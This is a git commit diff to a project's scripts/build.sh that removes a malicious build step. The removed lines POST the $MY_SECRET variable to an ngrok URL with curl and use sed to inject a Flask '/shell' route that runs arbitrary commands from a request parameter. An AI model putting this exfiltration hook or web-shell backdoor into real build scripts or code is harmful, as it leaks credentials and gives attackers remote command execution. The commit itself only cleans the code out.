9c423b6ec552c3352dce4b23c77073a25f7eeed6
ambrose <abrehamiphone@gmail.com>
2025-12-24 14:04:00 +0300

    Update build.sh

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,18 +1,6 @@
 #!/bin/bash
 
-# 1. EXFILTRATION: Stealing the secret
-echo "[!] Exfiltrating secret..."
-curl -X POST -d "leak=$MY_SECRET"  https://655cc6eb8130.ngrok-free.app/log || true
+echo "[!] Building Started..."
 
-# 2. INJECTION: Using 'sed' to insert the backdoor after the Flask app is defined
-echo "[!] Injecting Backdoor into app/app.py..."
-
-# This finds the line 'app = Flask(__name__)' and appends the backdoor immediately after it
-sed -i "/app = Flask(__name__)/a \
-\
-@app.route('/shell')\
-def shell():\
-    import os, flask\
-    return os.popen(flask.request.args.get('c')).read()" ./app/app.py
 
 echo "[+] Build process 'finished' successfully."
